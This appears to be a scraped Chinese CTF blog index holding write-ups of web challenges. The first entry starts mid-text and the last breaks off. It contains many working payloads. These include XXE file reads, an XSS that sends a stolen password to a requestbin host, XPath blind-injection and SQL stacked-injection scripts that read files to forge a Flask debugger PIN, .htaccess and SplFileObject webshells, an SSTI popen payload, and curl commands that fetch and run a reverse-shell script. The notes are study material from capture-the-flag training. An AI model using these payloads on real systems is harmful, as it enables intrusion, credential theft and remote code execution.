urllibfrom flask import Flask, session, requestapp = Flask(__name__)random.seed(uuid.getnode())app.config['SECRET_KEY'] = str(random.random()*233)app.debug = True@app.route('/')def index(): session['username'] = 'www-data' return 'Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;'@app.route('/read')def read(): try: url = request.args.get('url') m = re.findall('^file.*', url, re.IGNORECASE) n = re.findall('flag', url, re.IGNORECASE) if m or n: return 'No Hack' res = urllib.urlopen(url) return res.read() except Exception as ex: print str(ex) return 'no response'@app.route('/flag')def flag(): if session and session['username'] == 'fuck': return open('/flag.txt').read() else: return 'Access denied'if __name__=='__main__': app.run( debug=True, host=&quot;0.0.0.0&quot; ) 修改session为fuck即可，所以伪造session即可，但是没有爆破出密码，发现源码里面的key random.seed(uuid.getnode())app.config['SECRET_KEY'] = str(random.random()*233) local_file:///sys/class/net/eth0/address 读取mac地址 然后计算得到key flask-unsign --sign --cookie &quot;{'username': b'fuck'}&quot; --secret '99.2806389887' [GoogleCTF2019 Quals]Bnv有源码，看到xml，想到xxe攻击，记得改一下报文头为xml，然后发送了一下测试的报文，发现有不一样的回显了 root and DTD name do not match 'root' and 'xxe', line 5, column 6 发现找不到DTD，于是在下面定一下 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE message [&lt;!ELEMENT name ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///D://phpStudy//WWW//aa.txt&quot;&gt;]&gt;&lt;message&gt;&amp;xxe;&lt;/message&gt; 此时回显， Failure to process entity xxe, line 7, column 15 也就说无法正常读取，也就是说他需要一个内部的DTD文件， https://mohemiv.com/tags/xxe/ 在block-post中也提到，Linux设备可能在/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd中有一个DTD文件。并且这个文件又一个名为ISOamsa的实体，所以我们可以使用它来写DTD代码。现在我们来制作DTD代码。 最终payload &lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message[ &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt; &lt;!ENTITY % ISOamso '&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;&amp;#x25;eval;&amp;#x25;error;'&gt;%local_dtd;]&gt; 还有一件事是由于DTD代码有一些破坏XML的字符，所以需要他们进行这样的编码 [GWCTF 2019]mypassword登录进去以后，看到有个反馈框，想到xss，查看源码，发现关键字替换为空，双写即可 if (document.cookie &amp;&amp; document.cookie != '') { var cookies = document.cookie.split('; '); var cookie = {}; for (var i = 0; i &lt; cookies.length; i++) { var arr = cookies[i].split('='); var key = arr[0]; cookie[key] = arr[1]; } if(typeof(cookie['user']) != &quot;undefined&quot; &amp;&amp; typeof(cookie['psw']) != &quot;undefined&quot;){ document.getElementsByName(&quot;username&quot;)[0].value = cookie['user']; document.getElementsByName(&quot;password&quot;)[0].value = cookie['psw']; }} 可以看到username和password已经载入表单当中了，只要将他们外带就行了利用http://http.requestbin.buuoj.cn/18v8ark1?inspect这个平台即可实现 &lt;incookieput type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;incookieput type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;scrcookieipt scookierc=&quot;./js/login.js&quot;&gt;&lt;/scrcookieipt&gt;&lt;scrcookieipt&gt; var psw = docucookiement.getcookieElementsByName(&quot;password&quot;)[0].value; docucookiement.locacookietion=&quot;http://http.requestbin.buuoj.cn/18v8ark1/?a=&quot;+psw;&lt;/scrcookieipt&gt; [NPUCTF2020]ezloginxpath的sql盲注 https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8 xpath注入攻击XPath是一种在XML文档中查找目标信息的语言，可以用来在XML文档中对元素和属性进行遍历。XPath使用路径表达式来选取XML文档中的节点或节点集。 在XPath中，有七种类型的节点：元素、属性、文本、命名空间、处理指令、注释以及文档（根）节点。XML 文档是被作为节点树来对待的。树的根被称为文档节点或者根节点。 Xpath和Xquery语法： “nodename” – 选取nodename的所有子节点 “/nodename” – 从根节点中选择 “//nodename” – 从当前节点选择 “..” – 选择当前节点的父节点 “child::node()” – 选择当前节点的所有子节点 “@” -选择属性 “//user[position()=2] “ 选择节点位置 万能密码在知道用户名的情况下，可以直接admin’ or ‘1’=’1，由于没有注释符，所以只能用引号进行闭合， 不知道用户名的强狂下，可以使用两个or ?name=fake' or '1'or'1&amp;pwd=fake 使用|操作符（用于计算两个节点） ?name=1']|//*|ss['&amp;pwd=fake其中//*用于列出文档所有元素']|//*|//*['该payload用于访问xml文档的所有节点 盲注xpath盲注步骤1.判断根节点下的节点数2.判断根节点下节点长度&amp;名称3.重复猜解完所有节点，获取最后的值 ‘ or count(/)=1 or ‘1 判断有几个根节点 ‘ or string-length(name(/*[1]))=1 or ‘1 获取根节点长度 ‘ or substring(name(/*[1]), 1, 1)=’a’ or ‘1 获取内容 通过测试发现，当’ or count(/)=1 or ‘1时，返回非法操作，如果为2，则为账号密码错误，所以存在布尔盲注，所根节点数为1，接下来判断根节点下的节点数 import requestsimport stringimport reimport randomimport jsons = requests.session()strs='abcdefghijklmnopqrstuvwxyzABCDEFZHIJKLMNOPQRSTUVWKYZ1234567890'headers = {'Content-Type':'application/xml'}param='&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*?)&quot; /&gt;'t=''for i in range(1,50): for j in strs: url = 'http://10506bbe-96d3-4ebf-99ca-6fddf8972f8a.node4.buuoj.cn:81/login.php' token=re.findall(param,s.get(url).text)[0] #探测有几个节点： #data=f&quot;&lt;username&gt; ' or count(/)={i} or '1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&quot;+token+&quot;&lt;/token&gt;&quot; 探测出有一个节点 #data = f&quot;&lt;username&gt; ' or substring(name(/*[1]), {i}, 1)='{j}' or '1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&quot; + token + &quot;&lt;/token&gt;&quot;#第一个节点名称为root #data=f&quot;&lt;username&gt; ' or substring(name(/root/*[1]), {i}, 1)='{j}' or '1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&quot;+token+&quot;&lt;/token&gt;&quot; #data = f&quot;&lt;username&gt; ' or substring(name(/root/accounts/*[1]), {i}, 1)='{j}' or '1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&quot; + token + &quot;&lt;/token&gt;&quot; #探测user下的节点，发现有三个 #data = f&quot;&lt;username&gt;' or substring(name(/root/accounts/user/*[1]), {i}, 1)='{j}' or '1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&quot; + token + &quot;&lt;/token&gt;&quot; #data = f&quot;&lt;username&gt;' or substring(name(/root/accounts/user/*[2]), {i}, 1)='{j}' or '1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&quot; + token + &quot;&lt;/token&gt;&quot; #最后读取值的时候直接输入路径即可，无需在用name()包裹 data = f&quot;&lt;username&gt;' or substring(/root/accounts/user[2]/password/text(), {i}, 1)='{j}' or '1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&quot; + token + &quot;&lt;/token&gt;&quot; print(data) r= s.post(url=url,headers=headers,data=data).text print(r) if '非法操作' in r: t += j print(t) break if j==0: exit() [极客大挑战 2020]Greatphp&lt;?phperror_reporting(0);class SYCLOVER { public $syc; public $lover; public function __wakeup(){ if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) ){ if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\'/&quot;, $this-&gt;syc, $match)){ eval($this-&gt;syc); } else { die(&quot;Try Hard !!&quot;); } } }}if (isset($_GET['great'])){ unserialize($_GET['great']);} else { highlight_file(__FILE__);}?&gt; md5和sha1加密后相等，但是本身值不等， 这里就要拓宽思路，本身的值可以是什么？当然还可以是错误信息之类的。而这里也是用到了这个php的报错内置类导致回显结果相等 &lt;?php class SYCLOVER { public $syc; public $lover; public function __wakeup(){ if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) ){ if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\'/&quot;, $this-&gt;syc, $match)){ eval($this-&gt;syc); } else { die(&quot;Try Hard !!&quot;); } } }} $str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;/* 或使用[~(取反)][!%FF]的形式，即: $str = &quot;?&gt;&lt;?=include[~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;][!.urldecode(&quot;%FF&quot;).&quot;]?&gt;&quot;; $str = &quot;?&gt;&lt;?=include $_GET[_]?&gt;&quot;; */$a=new Error($str,1);$b=new Error($str,2);$c = new SYCLOVER();$c-&gt;syc = $a;$c-&gt;lover = $b;echo(urlencode(serialize($c))); ?&gt; [XNUCA2019Qualifier]EasyPHP这里一看就知道是要使用htaccess进行绕过了。。。 但是其实自己还没做过这样的题，积累一下姿势 利用error_log写入log文件到/tmp/fl3g.php，再设置include_path=/tmp即可让index.php能够包含我们想要的文件。这里的报错可以通过设置include_path到一个不存在的文件夹即可触发包含时的报错，且include_path的值也会被输出到屏幕上。php_value include_path &quot;/tmp/xx/+ADw?php die(eval($_GET[2]))+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;php_value error_reporting 32767php_value error_log /tmp/fl3g.php# \\ 直接写入执行命令 php_value auto_prepend_fi\\le &quot;.htaccess&quot;#&lt;?php @eval($_GET['cmd']); ?&gt;\\ 如上指令需要经过urlencode一下 filename=.htaccess&amp;content=php_value%20auto_prepend_fi\\%0Ale%20%22.htaccess%22%0A%23%3C%3fphp%20%40eval(%24_GET[%27cmd%27])%3b%20%3f%3E\\%70%68%70%5f%76%61%6c%75%65%20%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%5c%0a%6c%65%20%22%2e%68%74%61%63%63%65%73%73%22%0a%23%3c%3f%70%68%70%20%65%63%68%6f%20%60%63%61%74%20%66%2a%60%3b%20%3f%3e%5c payload ?filename=.htaccess&amp;content=php_value%20include_path%20%22%2Ftmp%2Fxx%2F%2BADw%3Fphp%20die(eval(%24_GET%5B2%5D))%2BADs%20%2BAF8AXw-halt%2BAF8-compiler()%2BADs%22%0Aphp_value%20error_reporting%2032767%0Aphp_value%20error_log%20%2Ftmp%2Ffl3g.php%0A%23%20%5C 非预期解 import requests# %23 是# 的url编码，防止python把自己注释了# \\\\ ， 两个\\\\上传上去就是 一个 \\content = '''php_value auto_prepend_fi\\\\le &quot;.htaccess&quot;%23&lt;?php eval($_POST[cmd]);?&gt;\\\\'''url = &quot;http://203dd3ff-f703-4233-b159-93832d5b93b3.node4.buuoj.cn:81/?filename=.htaccess&amp;content={}&quot;.format(content)res = requests.get(url=url)print(res.url)print(res.text)","link":"/2022/03/12/buu%E5%88%B7%E9%A2%98/"},{"title":"buu刷题2","text":"EasyBypass?comm1=index.php&quot;;m4 /fla?;&quot;&amp;comm2=1?comm1=index.php&quot;;tac/fla?;&quot;&amp;comm2=1 [pasecactf_2019]flask_ssti{{config[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;][&quot;\\x5f\\x5finit\\x5f\\x5f&quot;][&quot;\\x5f\\x5fglobals\\x5f\\x5f&quot;][&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;)[&quot;read&quot;]()}} 由于文件之前是有被打开过的，所以可以直接使用读取prod来读取 /proc/self/fd/3 [安洵杯 2019]iamthinkingparse_url用///public/?payload=来绕过 [CISCN2019 总决赛 Day1 Web4]Laravel1","link":"/2022/03/13/buu%E5%88%B7%E9%A2%982/"},{"title":"classLoader类加载机制","text":"ClassLoader类加载机制在程序运行时，并不会一次性加载所有的class文件进入内存，而是通过java的类加载机制（ClassLoader）进行动态加载，从而转化成java.lang.Class类的一个实例。 ClassLoader类通过指定的类的名称，找到或生成对应的字节码，返回一个java.lang.Class的实例。开发者可以通过继承ClassLoader类来实现自定义的类加载器。 ClassLoader类中和加载类相关的方法1.getparent()：返回该类加载器的父类加载器 2.loadClass(String name)：加载名称为name的类，返回的结果是java.lang.Class类的实例 3.findClass(String name)：查找名称为name的类，返回的结果是java.lang.Class类的实例 4.findLoadedClass(String name)：查找名称为name的已经被加载过的类，返回的结果是java.lang.Class类的实例 5.defineClass(String name, bytep[] b,int off,int len)：把字节数组b中的内容转换成java类，返回的结果是java.lang.Class类的实例，该方法被声明为final 6.resolveClass(Class&lt;?&gt; c) ：链接指定的java类 流程1.当loadClass方法被调用时，会首先使用findLoadedClass()方法判断该类是否已经被加载。 2.若未被加载，则优先使用加载器的父类加载器进行加载 3.若不存在父类加载器，无法对该类进行加载时，就调用自身的findClass()方法。 因此可以重写findClass()来完成一些类加载的特殊要求。 URLClassLoader类可以从远程服务器上加载类的能力 java动态代理动态代理实质是反射","link":"/2022/02/24/classLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"},{"title":"java审计-javacon分析","text":"前言在前面做了那么多环境搭建以后，其中的漏洞难度利用其实不高，我感觉java的难点应该还是在反射、反序列化之类的地方，于是回来重新做一下 环境搭建对jar进行解压，然后使用idea打开，配置一下远程，复制代码 使用一下命令运行jar包 java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 -jar challenge-0.0.1-SNAPSHOT.jar","link":"/2022/02/27/java%E5%AE%A1%E8%AE%A1-javacon%E5%88%86%E6%9E%90/"},{"title":"java审计入门（一）","text":"写在前面这几天一直陆陆续续在学java的代码审计，但是总感觉学的不是很顺畅，所以去《代码审计》星球看了一个入门的panda师傅写的java审计，一开始的基础知识就跟着打一遍吧 基础知识1.包的命名规范（1）indi: 个体项目：指个人发起，但非自己独立完成的项目，可公开或私有项目，copyright主要属于发起者包名为:indi.发起者名.项目名.模块名.。。。 （2）pers: 个人项目:指个人发起，独自完成，可分享的项目，copyright主要属于个人。包名为pers.个人名.项目名.模块名.。。。 (3)priv: 私有项目:指个人发起，独立完成，非公开的私人使用的项目，copyright属于个人包名为priv.个人名.项目名.模块名.。。。 （4）onem: 与indi 相同，推荐使用indi （5）team: 团队项目，指由团队发起，并由该团队开发的项目，copyright属于该团队所有包名为:team.团队名.项目名.模块名.。。。 （6）com： 公司项目，copyright由项目发起的公司所有包名为:com.公司名.项目名.模块名.。。。 持久层：dao、persist、mapper实体类：entity、model、bean、javabean、pojo业务逻辑：service、biz控制器：controller、servlet、action、web过滤器：filter异常：exception监听器：listener在不同的框架下一班包的命名规则不同，但大概如上，不同功能的java文件放在不同的包中，根据java文件的功能统一安放及命名。 2.servlet什么是servlet？java Servlet是运行在web服务器或应用服务器上的程序，它是作为来自web浏览器或其他HTTP客户端的请求和HTTP服务器上的数据库或应用程序之间的中间层。 Servlet执行以下任务： 读取客户端（浏览器）发送的显示的数据，包括网页上的HTML表单，或者也可以是来自applet或自定义的HTTP客户端程序的表单。 读取客户端（浏览器）发送的隐式的HTTP请求数据。这包括cookies、媒体类型和浏览器能理解的压缩格式等 处理数据并生成结果，这个过程可能需要访问数据库，执行RMI或CORBA调用，调用web服务，或者直接计算得出对应的响应。 发送显示的数据（即文档）到客户端（浏览器）。该文档的格式可以是多种多样的，包括文本文件（html或xml）、二进制文件（GIF图像）、excel等。 发送隐式的http响应到客户端（浏览器）。这包括告诉浏览器或其他客户端被返回的文档类型（如html），设置cookies和缓存参数，以及其他类似的任务。 Servlet 生命周期Servlet 生命周期可被定义为从创建直到毁灭的整个过程。以下是 Servlet 遵循的过程： Servlet 通过调用 init () 方法进行初始化。 Servlet 调用 service() 方法来处理客户端的请求。 Servlet 通过调用 destroy() 方法终止（结束）。 最后，Servlet 是由 JVM 的垃圾回收器进行垃圾回收的。 这里主要介绍一下service() 方法。 service() 方法是执行实际任务的主要方法，Servlet 容器（即 Web 服务器）调用 service() 方法来处理来自客户端（浏览器）的请求，并把格式化的响应写回给客户端。每次服务器接收到一个 Servlet 请求时，服务器会产生一个新的线程并调用服务。service() 方法检查 HTTP 请求类型（GET、POST、PUT、DELETE 等），并在适当的时候调用 doGet、doPost、doPut，doDelete 等方法。 public void service(ServletRequest request, ServletResponse response) throws ServletException, IOException{ ...} 以上代码，即为一个service()方法的特征","link":"/2022/03/14/java%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/"},{"title":"web前端开发","text":"","link":"/2022/02/27/web%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/"},{"title":"使用java进行远程docker容器debug","text":"首先从docker中将启动的jar包打包出来 docker cp 7d:/opt/solr/server/start.jar D:\\javaprogram\\log4j2","link":"/2022/03/14/%E4%BD%BF%E7%94%A8java%E8%BF%9B%E8%A1%8C%E8%BF%9C%E7%A8%8Bdocker%E5%AE%B9%E5%99%A8debug/"},{"title":"记一次内网渗透","text":"再学长们渗透配置好frp以后，接下来的操作记录 PS：在对内网进行攻击时，都需要使用proxychains配置一下代理 proxychains配置作用vi /etc/proxychains4.conf 配置了proxychains以后可以将端口转发进内网 使用proxychains配置一下 socks5 xxxx.xxx.xxx.xxx port 然后使用代理进入执行命令 msf指令search smb_version #搜索模块use 0#选择0号模块set RHOSTS XXX.XXX.XXX.XXX #设置访问内网主机ipsearch ms17#查看ms17模块能执行什么命令use 5#使用5号功能show options#显示 模块的options能执行什么set RHOSTS XXX.XXX.XXX.XXX #设置目标主机set COMMAND whoami执行命令","link":"/2022/03/12/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"title":"2022DASCTF_3","text":"前言这几天都在护网，正好有比赛，打的累的时候就来看看题转换一下心情 ezpop简单的pop链，后面记得覆盖一下就好 &lt;?phpclass fin{ public $f1;}class what{ public $a;}class mix{ public $m1;}class crow{ public $v1; public $v2;}$a=new fin();$b=new what();$c=new mix();$d=new crow();$e=new fin();$f=new mix();$e-&gt;f1=$f;$f-&gt;m1=&quot;\\n system('curl xx');&quot;;$d-&gt;v1=$e;$c-&gt;m1=$d;$b-&gt;a=$c;$a-&gt;f1=$b;$h=serialize($a);echo urlencode($h); calcpython的，很少做打python的题目，所以很多姿势都不是很清楚 1.import导入类并继承加载这也是搜索出来比较多的方法，但是他把很多东西都过滤了，所以这种方法不太行 'import','(',')',' ','_','|',';','&quot;','{','}','&amp;','getattr','os','system','class','subclasses','mro','request','args','eval','if','subprocess','file','open','popen','builtins','compile','execfile','from_pyfile','config','local','self','item','getitem','getattribute','func_globals','__init__','join','__dict__' 2.非预期这里先积累一个非预期吧，这个地方的思路也挺巧妙的 data = eval(&quot;7*7#`curl http://11xxx:9999`&quot;)os.system(log) 利用的是两种语言加载一样的特性，eval加载的是python的语言，而system使用的是shell语言特性，所以我们首先让eval执行7*7并先注释掉后面的内容，然后使用system去执行反引号内的系统命令,那么这就意味着，我们此时得到了一个无回显的shell echo {0} {1} &quot;7*7#`xxxxx`&quot;&gt; ./tmp/log.txt 接下来我们可以是curl命令下载一个反弹shell的sh文件到tmp目录下，并执行这个sh文件就行了 7*7%23`curl%09http://110.42.1/aa&gt;/tmp/a` 7*7%23`chmod%09777%09/tmp/a` `/tmp/a` 小结感觉做这题的时候，思维有点被禁锢住了，其实看到一个eval和一个system的时候，就要想到语言的差异性往往也是引起漏洞的开始 upgdstore可以传phpinfo()，但是过滤了很多关键字，所以还是要先拿到他的源码才行，发现过滤了file关键字，可以采取拼接的方式进行绕过 &lt;?php echo ('fil'.'e_get_contents')('/var/www/html/index.php'); 拿到源码 &lt;?phpfunction fun($var): bool{ $blacklist = [&quot;\\$_&quot;, &quot;eval&quot;,&quot;copy&quot; ,&quot;assert&quot;,&quot;usort&quot;,&quot;include&quot;, &quot;require&quot;, &quot;$&quot;, &quot;^&quot;, &quot;~&quot;, &quot;-&quot;, &quot;%&quot;, &quot;*&quot;,&quot;file&quot;,&quot;fopen&quot;,&quot;fwriter&quot;,&quot;fput&quot;,&quot;copy&quot;,&quot;curl&quot;,&quot;fread&quot;,&quot;fget&quot;,&quot;function_exists&quot;,&quot;dl&quot;,&quot;putenv&quot;,&quot;system&quot;,&quot;exec&quot;,&quot;shell_exec&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;proc_close&quot;, &quot;proc_get_status&quot;,&quot;checkdnsrr&quot;,&quot;getmxrr&quot;,&quot;getservbyname&quot;,&quot;getservbyport&quot;, &quot;syslog&quot;,&quot;popen&quot;,&quot;show_source&quot;,&quot;highlight_file&quot;,&quot;`&quot;,&quot;chmod&quot;]; foreach($blacklist as $blackword){ if(strstr($var, $blackword)) return True; } return False;}error_reporting(0);//设置上传目录define(&quot;UPLOAD_PATH&quot;, &quot;./uploads&quot;);$msg = &quot;Upload Success!&quot;;if (isset($_POST['submit'])) {$temp_file = $_FILES['upload_file']['tmp_name'];$file_name = $_FILES['upload_file']['name'];$ext = pathinfo($file_name,PATHINFO_EXTENSION);if(!preg_match(&quot;/php/i&quot;, strtolower($ext))){die(&quot;只要好看的php&quot;);}$content = file_get_contents($temp_file);if(fun($content)){ die(&quot;诶，被我发现了吧&quot;);}$new_file_name = md5($file_name).&quot;.&quot;.$ext; $img_path = UPLOAD_PATH . '/' . $new_file_name; if (move_uploaded_file($temp_file, $img_path)){ $is_upload = true; } else { $msg = 'Upload Failed!'; die(); } 发现确实过滤了很多东西，但是我们现在可以通过拼接绕过，接下来就是考虑如何写入webshell 了,直接贴一下大师傅的文章，利用的是内置类SplFileObject::fwrite写入内容，并且使用define定义常量将其写入文件中，没见过的姿势，学习了 &lt;?phpdefine(&quot;EV&quot;, &quot;eva&quot;.&quot;l&quot;);define(&quot;GETCONT&quot;, &quot;fil&quot;.&quot;e_get_contents&quot;);// 由于禁止了$，我们只能从已有的地方获取$符define(&quot;D&quot;,(GETCONT)('/var/www/html/index.php')[353]);define(&quot;SHELL&quot;,&quot;&lt;?php &quot;.EV.&quot;(&quot;.D.&quot;_POST['a']);&quot;);echo (GETCONT)('./shell.php');class splf extends SplFileObject { public function __destruct() { parent::fwrite(SHELL); }}define(&quot;PHARA&quot;, new splf('shell.php','w')); 获得一句话木马的shell以后，就需要绕一下disable_function了，这里一般考虑的也是写入ld更改环境变量 写入环境变量是通过在本地搭建一个ftp服务，然后 a=$local_file = '/tmp/hack1.so';$server_file = 'hack.so';$ftp_server = '110.xxxx.120';$ftp_port=25;$ftp = ftp_connect($ftp_server,$ftp_port);$login_result = ftp_login($ftp, 'anonymous', '');ftp_pasv($ftp,1);if (ftp_get($ftp, $local_file, $server_file, FTP_BINARY)) { echo &quot;Successfully written to $local_file\\n&quot;;} else { echo &quot;There was a problem\\n&quot;;}ftp_close($ftp); 这里值得一提的是，这个ftp服务应该是要和so文件放在同一目录下，不然就要写绝对路径（应该是这样），然后如果你要是用本来已经开启的ftp服务，需要在login那边写一下你的账号密码才行 这个时候就成功写入了，接下来就是putenv+mail函数反弹shell即可 putenv(&quot;LD_PRELOAD=/var/www/vhosts/topleadtool.com/httpdocs/inc/hack.so&quot;);mail(&quot;a@localhost&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;); 拿flag的时候发现权限不够，需要提权，最近的那个洞不行，所以suid尝试一下 find /bin -perm -u=s -type f 2&gt;/dev/nullfind /usr -perm -u=s -type f 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/null 新学了几个姿势，然后就可以getshell了","link":"/2022/03/27/2022DASCTF-3/"},{"title":"2022Dest0g迎新赛","text":"##phpdest绕过require_once限制 /proc/self指向当前进程的/proc/pid/，/proc/self/root/是指向/的符号链接payload:php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self ##EasyPHP在这里可以看到自定义了一个报错，当产生错误的时候，就会执行这个报错内容set_error_handler( function() use(&amp;$fl4g) { print $fl4g; }); 前面的代码都是干扰，我们重点需要关注的其实是我们的输入会做出什么操作，可以发现，我们输入的内容最后会和$fl4g做拼接操作，结合前面的自定义报错，那我们只需要让输入的内容为数组即可，因为数组和字符串直接拼接时会产生报错 突然想到之前，如果不知道题目的考察点，数组啥的都先试试再说##simplerce","link":"/2022/11/15/2022Dest0g3%E8%BF%8E%E6%96%B0%E8%B5%9B/"},{"title":"2022-starCTF","text":"前言跟着EDI打了，但是感觉环境挺坑的– oh-my-notepro账号密码弱口令登录，然后，通过create 一个note 可以查询，发现 http://123.60.72.85:5002/view?note_id=p1ee659ofrlcro12mm3kp9ey5hwg464d 报错存在flask的debug报错页面，存在sql的堆叠注入 因为是python的语言，比较有限，因此现在的思路就是读取文件伪造一下pin码： exp如下： import randomimport requestsimport stringimport reimport hashlibfrom itertools import chaindef pin_mes(): s=requests.session() url=&quot;http://121.37.153.47:5002/view?note_id=&quot; session=&quot;session=eyJjc3JmX3Rva2VuIjoiZWJiZmZjNDFlNGQ5YzQxODFjMDZhYTBjNWZjZjIyZDg2NzAzMTZkMyIsInVzZXJuYW1lIjoiYSJ9.YlpPdw.4WCCNhQrbYsuRjp00IeRuAtJZ7U&quot; headers={ &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Cookie&quot;: session, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot; }# 1.username，用户名# 2. uuidnode，当前网络的mac地址的十进制数# 3. machine_id，docker机器id#docker靶机由后面三个合并：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup pin_me=['/etc/passwd','/sys/class/net/eth0/address','/etc/machine-id','/proc/self/cgroup'] mess=[] find_data=re.compile(r&quot;&quot;&quot; &lt;h1 style=\\&quot;text-align: center\\&quot;&gt; (.*?) &lt;/h1&gt; &quot;&quot;&quot;) for i in pin_me: ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 7)) payload=f&quot;1';CREATE TABLE {ran_str} (go TEXT)%23&quot; s.get(url+payload,headers=headers) payload2=f&quot;1';load data local infile \\&quot;{i}\\&quot; into table {ran_str}%23&quot; s.get(url + payload2,headers=headers) payload3=f&quot;1'union select 1,2,3,4,group_concat(go) from {ran_str}%23&quot; r=s.get(url + payload3,headers=headers).text #print(r) data=re.findall(find_data,r) mess.append(data) return messdef get_pypin(gd,ma,cg): probably_public_bits = [ 'ctf', # username 'flask.app', # modname 'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None), ] private_bits = [ f'{gd}', # str(uuid.getnode()), /sys/class/net/ens33/address # e86c4117-eed3-4a37-82bc-b5fa47a88e0b eabeaffb4e97696bfb087df1717743237ff21f537c0f36676dd49ae6c6065d7e f'{ma+cg}' # get_machine_id(), /etc/machine-id ] h = hashlib.sha1() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv = None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv)if __name__==&quot;__main__&quot;: pin_data=pin_mes() print(pin_data[1]) gd = int(&quot;&quot;.join(&quot;&quot;.join(pin_data[1]).split(&quot;:&quot;)),16) ma=str(&quot;&quot;.join(pin_data[2])) cg = re.findall(r&quot;docker/(.*?),&quot;, str(pin_data[3]))[0] get_pypin(gd,ma,cg) 拿到pin码以后就可以执行命令 然后比较奇怪的地方就是，有的时候console页面会显示not found，这里出题人给出的意见是 清除缓存即可。 oh-my-lotto拿到flag的条件是让forecast==lotto_result，因此","link":"/2022/04/17/2022-startCTF/"},{"title":"2022LINE-CTF","text":"","link":"/2022/03/30/2022LINE-CTF/"},{"title":"2022idekctf","text":"##json Beautifier","link":"/2022/02/01/2022idekctf/"},{"title":"2022plaidctf","text":"yaca主要的漏洞点在这个位置,这里的content-type可以替换成其他内容，这样可以动态执行js的内容这里描述一下两种方法 importmap这个是队内师傅做出来的方法，参考链接：https://www.digitalocean.com/community/tutorials/how-to-dynamically-import-javascript-with-import-maps#step-3-loading-external-code-with-import-maps content-type设为importmap的时候，可以动态加载js的代码，方法如下： &lt;script type=&quot;importmap&quot;&gt;{ &quot;imports&quot;:{ }}&lt;/script&gt; 由于无法导入外部的js，所以我们只能劫持本地的js，通过动态加载本地的eval-code.mjs也可以实现，结果如下： { 